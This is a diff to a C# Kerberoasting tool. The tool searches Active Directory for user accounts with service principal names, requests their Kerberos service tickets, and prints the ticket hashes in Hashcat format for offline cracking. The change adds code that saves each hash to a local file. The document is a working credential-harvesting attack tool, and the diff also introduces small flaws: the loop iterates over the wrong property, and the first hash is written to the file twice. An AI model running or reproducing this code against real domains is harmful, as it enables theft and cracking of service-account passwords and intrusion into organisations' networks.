@@ -1,20 +1,19 @@
 using System;
 using Asn1;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.DirectoryServices.AccountManagement;
 using System.IdentityModel.Selectors;
 using System.IdentityModel.Tokens;
 using System.DirectoryServices;
+using System.IO;
 
 namespace Kerberos
 {
     class Program
     {
-        public static string userName="NoUser";
+        public static string userName = "NoUser";
         public static string domain = System.Environment.UserDomainName;
+        public static string myFile = @".\mykerb.txt";
+
 
         static byte[] GetToken(string servicePrincipalName)
         {
@@ -71,6 +70,7 @@ namespace Kerberos
                                             Console.WriteLine("> Hash.....................:" + cipherText.Substring(0, 32) + cipherText.Substring(32));
                                             Console.WriteLine("");
                                             Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
+                                            AppendToMyFile(myFile, hashcatFormat);
                                         }
                                         if (encTypeToken == 18)
                                         {
@@ -82,6 +82,7 @@ namespace Kerberos
                                             Console.WriteLine("> Hash.....................:" + cipherText.Substring(0, 32) + cipherText.Substring(32));
                                             Console.WriteLine("");
                                             Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
+                                            AppendToMyFile(myFile, hashcatFormat);
                                         }
                                         if (encTypeToken == 23)
                                         {
@@ -94,6 +95,7 @@ namespace Kerberos
                                             Console.WriteLine("> Hash.....................:" + cipherText.Substring(checksumStart) + cipherText.Substring(0, checksumStart));
                                             Console.WriteLine("");
                                             Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
+                                            AppendToMyFile(myFile, hashcatFormat);
                                         }
                                     }
                                 }
@@ -122,12 +124,14 @@ namespace Kerberos
         {
             try
             {
-                using (DirectoryEntry root = new DirectoryEntry("LDAP://"+domain))
+                using (DirectoryEntry root = new DirectoryEntry("LDAP://" + domain))
                 using (DirectorySearcher searcher = new DirectorySearcher(root))
                 {
-                    searcher.Filter = "(|(&(objectCategory=user)(servicePrincipalName=*))(userAccountControl:1.2.840.113556.1.4.803:=512))";
+                    //searcher.Filter = "(|(&(objectCategory=user)(servicePrincipalName=*))(userAccountControl:1.2.840.113556.1.4.803:=512))";
+                    searcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
                     searcher.PropertiesToLoad.Add("servicePrincipalName");
                     searcher.PropertiesToLoad.Add("Samaccountname");
+                    searcher.PageSize = 10000;
 
                     SearchResultCollection results = searcher.FindAll();
 
@@ -135,7 +139,7 @@ namespace Kerberos
                     {
                         if (result.Properties.Contains("servicePrincipalName"))
                         {
-                            foreach (var spn in result.Properties["servicePrincipalName"])
+                            foreach (var spn in result.Properties["Samaccountname"])
                             {
                                 //Console.WriteLine();
                                 Kerberoasting(result.Properties["Samaccountname"][0].ToString());
@@ -180,12 +184,16 @@ namespace Kerberos
                     return 1;
                 }
                 Console.WriteLine("Getting the SPN for Aure AD SSO completed successfully. Now extract the TGS from memory...");
-            }
-            else
+            } else
             {
                 Help();
             }
             return 0;
+        }
+        static void AppendToMyFile(string myFileName, string strContent)
+        {
+            if (!File.Exists(myFileName)) { using (StreamWriter sw = File.CreateText(myFileName)) { sw.WriteLine(strContent); sw.Close(); }; } //check if file exists if not create it
+            File.AppendAllText(myFileName, strContent + "\r\n");
         }
     }
 }
